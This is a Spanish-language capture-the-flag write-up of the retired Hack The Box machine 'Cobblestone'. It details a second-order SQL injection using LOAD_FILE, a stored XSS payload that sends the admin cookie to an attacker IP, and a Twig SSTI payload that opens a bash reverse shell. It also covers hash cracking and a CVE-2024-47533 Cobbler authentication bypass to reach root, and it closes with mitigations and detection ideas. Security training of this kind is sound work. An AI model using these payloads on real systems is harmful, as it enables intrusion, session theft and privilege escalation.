---
machine: Cobblestone
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, sqli, second-order, xss, twig, ssti, cobbler, cve-2024-47533]
---

# Cobblestone — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Debian 12 con dos vhosts. Una **SQLi de segundo orden** en la votación permite `LOAD_FILE` y leer la configuración de Apache, que revela el proxy interno a **Cobbler** en `127.0.0.1:25151`. Un **XSS almacenado** entrega la sesión del administrador, el panel de despliegues renderiza **Twig** con un campo de usuario (**SSTI**) y da shell; el hash bcrypt de la base de datos abre SSH como `cobble`; y **CVE-2024-47533** cierra como root con el bypass de autenticación de Cobbler.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
# 22, 80 y 443
ffuf -u http://<IP> -H "Host: FUZZ.cobblestone.htb" -w subdomains.txt -mc 200,403
```

```text
vote.cobblestone.htb     (app de votaciones)
deploy.cobblestone.htb   (panel de despliegues)
```

## Enumeración

`vote` es una web de votación con comentarios; `deploy` es una página de equipo detrás del login. Sin credenciales, el único punto de entrada es la votación: el comentario se guarda y se reutiliza después en la consulta de moderación del administrador (SQLi de segundo orden).

## Foothold

### 1. SQLi de segundo orden y lectura del fichero

El comentario `x', (SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'))) -- -` se guarda limplo y explota cuando el admin abre la moderación, que inserta el comentario en su consulta. El `LOAD_FILE` devuelve el `<VirtualHost>` con los `DocumentRoot` y, sobre todo:

```text
ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
```

Un servidor de aprovisionamiento **Cobbler** escuchando solo en localhost.

### 2. XSS almacenado y sesión de admin

El saneado se salta con un SVG en otro campo:

```html
<svg/onload=fetch('http://<IP>:8000/'+document.cookie)>
```

Hay variantes donde el admin lee una página con `phpinfo()` y la cookie aparece impresa en la propia respuesta, sin servidor externo. Con el `PHPSESSID` del admin se entra en `deploy`.

### 3. Twig SSTI

El panel renderiza un campo editable del usuario (el nombre en la gestión de usuarios) como plantilla Twig:

```text
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'")}}
```

```bash
nc -lvnp 4444
# www-deploy@cobblestone:~$
```

## Movimiento lateral

La base de datos de la aplicación guarda hashes bcrypt; el del usuario `cobble` cae con diccionario y se reutiliza por SSH:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
ssh cobble@cobblestone.htb
```

## Escalada de privilegios

Cobbler no es alcanzable desde fuera, pero sí desde la sesión SSH:

```bash
ssh -N -L 25151:127.0.0.1:25151 cobble@cobblestone.htb
curl -s -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><methodCall><methodName>version</methodName><params/></methodCall>' \
  http://127.0.0.1:25151/cobbler_api
# 3.3.6
```

**CVE-2024-47533** (Cobbler >= 3.0.0, < 3.2.3 y >= 3.3.0, < 3.3.7): `utils.get_shared_secret()` siempre devuelve `-1`, así que el login con usuario vacío y contraseña `-1` es válido. Con el token de administrador se crea una distro/perfil y se ejecuta un comando como root:

```python
import xmlrpc.client
srv = xmlrpc.client.ServerProxy("http://127.0.0.1:25151/cobbler_api", allow_none=True)
tok = srv.login("", -1)
# crear distro/perfil y lanzar la acción que ejecuta el comando
```

## Evidencia

```text
/home/cobble/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones aprendidas

- **SQLi de segundo orden**: el payload se guarda limpio y explota al releerlo; los WAF que solo miran la petición de entrada no lo ven.
- `LOAD_FILE` sigue disponible si el usuario de BD tiene `FILE`: la configuración de Apache es un mapa de la red interna.
- **SSTI** en un campo que parece cosmético (el nombre de un usuario) es RCE.
- **CVE-2024-47533 es un bypass de autenticación**, no una inyección de comandos: se entra con `""`/`-1` y se usan las APIs legítimas de Cobbler para ejecutar.
- Mitigación: consultas preparadas, `FILE` revocado, plantillas sin `registerUndefinedFilterCallback`, Cobbler parcheado y `cobblerd` con autenticación real.

## Mitigaciones y detección

- Consultas parametrizadas en todas las lecturas, incluidas las de moderación.
- Revocar `FILE` al usuario de la base de datos y no publicar la configuración de Apache por esa vía.
- Sandbox de Twig y allowlist de campos editables; nunca renderizar texto del usuario.
- Cobbler >= 3.2.3 / 3.3.7 y API sin exponer por proxy.
- Detección: comentarios con `LOAD_FILE`/`UNION`, sesiones de admin usadas desde otra IP, peticiones a `/cobbler_api` y logins con usuario vacío.

## Referencias

- [CVE-2024-47533](https://nvd.nist.gov/vuln/detail/CVE-2024-47533)
- [ssti](../../../knowledge/web/ssti.md)
